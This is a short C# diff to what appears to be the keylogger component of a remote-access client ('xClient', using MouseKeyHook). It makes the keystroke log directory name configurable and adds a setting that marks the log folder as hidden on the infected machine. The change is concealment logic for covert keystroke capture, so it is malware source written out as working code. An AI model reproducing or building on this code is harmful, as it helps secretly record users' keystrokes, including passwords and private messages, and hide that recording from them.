@@ -8,6 +8,7 @@ using xClient.Core.Helper;
 using xClient.Core.MouseKeyHook;
 using xClient.Core.Networking;
 using Timer = System.Timers.Timer;
+using xClient.Config;
 
 namespace xClient.Core.Utilities
 {
@@ -30,7 +31,7 @@ namespace xClient.Core.Utilities
         /// <summary>
         /// The directory where the log files will be saved.
         /// </summary>
-        public static string LogDirectory { get { return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Logs\\"); } }
+        public static string LogDirectory { get { return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Settings.LOGDIRECTORYNAME); } }
 
         private readonly Timer _timerFlush;
         private StringBuilder _logFileBuffer;
@@ -248,8 +249,13 @@ namespace xClient.Core.Utilities
 
             try
             {
-                if (!Directory.Exists(LogDirectory))
-                    Directory.CreateDirectory(LogDirectory);
+                DirectoryInfo di = new DirectoryInfo(LogDirectory);
+
+                if (!di.Exists)
+                    di.Create();
+
+                if(Settings.HIDELOGDIRECTORY)
+                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
 
                 if (!File.Exists(fileName))
                     writeHeader = true;
